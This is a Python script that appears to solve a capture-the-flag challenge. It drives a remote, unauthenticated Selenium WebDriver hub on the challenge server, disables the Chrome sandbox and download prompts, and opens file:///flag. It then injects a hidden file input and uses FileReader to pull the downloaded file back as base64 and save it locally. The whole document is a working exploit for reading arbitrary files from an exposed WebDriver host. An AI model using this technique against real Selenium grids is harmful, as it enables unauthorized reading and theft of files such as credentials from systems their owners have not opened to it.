import os, time, base64
from selenium import webdriver
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.common.desired_capabilities import DesiredCapabilities

# Fix chrome crash
chrome_options = webdriver.ChromeOptions()
chrome_options.add_argument("--no-sandbox")

# Disable download window popup
prefs = {"download.default_directory": "./",
         "download.prompt_for_download": 0,
         "profile.default_content_settings.popups": 0,
         "profile.default_content_setting_values.automatic_downloads": 1,
         'safebrowsing_for_trusted_sources_enabled': 0}

chrome_options.add_experimental_option("prefs", prefs)

# load webdrive module from chrome instance/session
driver = webdriver.Remote(
    command_executor='http://challs.nusgreyhats.org:12323/wd/hub',
    desired_capabilities=DesiredCapabilities.CHROME,
    options=chrome_options
)


# https://stackoverflow.com/questions/47068912/how-to-download-a-file-using-the-remote-selenium-webdriver
def get_downloaded_files(driver):
    if not driver.current_url.startswith("chrome://downloads"):
        driver.get("chrome://downloads/")

    return driver.execute_script(
        "return  document.querySelector('downloads-manager')  "
        " .shadowRoot.querySelector('#downloadsList')         "
        " .items.filter(e => e.state === 'COMPLETE')          "
        " .map(e => e.filePath || e.file_path || e.fileUrl || e.file_url); ")


def get_file_content(driver, path):
    elem = driver.execute_script(
        "var input = window.document.createElement('INPUT'); "
        "input.setAttribute('type', 'file'); "
        "input.hidden = true; "
        "input.onchange = function (e) { e.stopPropagation() }; "
        "return window.document.documentElement.appendChild(input); ")

    elem._execute('sendKeysToElement', {'value': [path], 'text': path})

    result = driver.execute_async_script(
        "var input = arguments[0], callback = arguments[1]; "
        "var reader = new FileReader(); "
        "reader.onload = function (ev) { callback(reader.result) }; "
        "reader.onerror = function (ex) { callback(ex.message) }; "
        "reader.readAsDataURL(input.files[0]); "
        "input.remove(); "
        , elem)

    if not result.startswith('data:'):
        raise Exception("Failed to get file content: %s" % result)

    return base64.b64decode(result[result.find('base64,') + 7:])


driver.get("file:///flag")  # From Dockerfile: COPY ./flag /flag

# list all the completed remote files (waits for at least one)
files = WebDriverWait(driver, 10, 1).until(get_downloaded_files)

# get the content of the first file remotely
content = get_file_content(driver, files[0])

# save the content in a local file in the working directory
with open('flag_ans', 'wb') as f:
    f.write(content)
